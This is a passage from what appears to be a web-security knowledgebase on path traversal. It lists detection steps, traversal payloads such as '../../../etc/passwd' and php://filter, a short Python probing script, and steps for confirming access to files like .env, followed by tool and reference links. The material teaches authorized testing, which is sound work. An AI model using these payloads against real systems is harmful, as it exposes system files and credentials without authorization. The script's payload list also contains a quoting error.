- Cache key injection via delimiter confusion
- Unkeyed query exploitation

---

## Detection Techniques

### Manual Detection

1. **Identify file loading parameters** - Look for `?file=`, `?page=`, etc.
2. **Test with basic traversal** - `../../../etc/passwd`
3. **Observe error messages** - May reveal path structure or OS
4. **Test encoded variants** - URL encoding, double encoding
5. **Test absolute paths** - `/etc/passwd`, `C:\windows\win.ini`
6. **Test null bytes** - `%00` with required extensions
7. **Test technology-specific** - `php://filter`, `..;/`, etc.

### Automated Detection

**Burp Suite:**
- Intruder with path traversal payload list
- Scanner checks for path traversal
- Param Miner for hidden parameters
- HTTP Request Smuggler for desync

**Nuclei:**
```bash
nuclei -u target.com -t http/vulnerabilities/path-traversal/
```

**Custom Scripts:**
```python
import requests

payloads = ['../', '..\', '%2e%2e%2f', '....//']
for payload in payloads:
    r = requests.get(f'https://target.com/file?path={payload}etc/passwd')
    if 'root:' in r.text:
        print(f'Vulnerable: {payload}')
```

### Confirming Vulnerabilities

1. **Read known files** - `/etc/passwd`, `win.ini`
2. **Read application files** - `config.php`, `.env`
3. **Test write capabilities** - Upload or write to temp files
4. **Check for blind traversal** - Time delays, DNS lookups, error differences

---

## References

### PortSwigger Research
- [What is path traversal?](https://portswigger.net/web-security/file-path-traversal)
- [HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [Browser-Powered Desync](https://portswigger.net/research/browser-powered-desync-attacks)
- [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [Cracking the Lens](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
- [Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)

### GitHub Resources
- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [Nuclei Templates - Path Traversal](https://github.com/projectdiscovery/nuclei-templates/tree/main/http/vulnerabilities/path-traversal)
- [Param Miner](https://github.com/PortSwigger/param-miner)
- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [SecLists - Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing)
- [SecLists - Web Content](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)
- [Client-Side Prototype Pollution](https://github.com/BlackFan/client-side-prototype-pollution)
- [pp-finder](https://github.com/yeswehack/pp-finder)
- [postMessage-tracker](https://github.com/fransr/postMessage-tracker)

### Documentation
- [HackTricks - File Inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [MDN - URIs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/URIs)
- [MDN - decodeURIComponent](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/decodeURIComponent)
- [MDN - URL API](https://developer.mozilla.org/en-US/docs/Web/API/URL)

### Tools
- [dotdotpwn](https://github.com/wireghoul/dotdotpwn)
- [IIS ShortName Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
- [shortscan](https://github.com/bitquark/shortscan)
- [smuggler](https://github.com/defparam/smuggler)
- [nuclei](https://github.com/projectdiscovery/nuclei)
- [httpx](https://github.com/projectdiscovery/httpx)
- [katana](https://github.com/projectdiscovery/katana)
- [subfinder](https://github.com/projectdiscovery/subfinder)
- [interactsh](https://github.com/projectdiscovery/interactsh)

---

*This knowledgebase is compiled for educational and authorized security testing purposes only. Always ensure you have explicit permission before testing any system.*
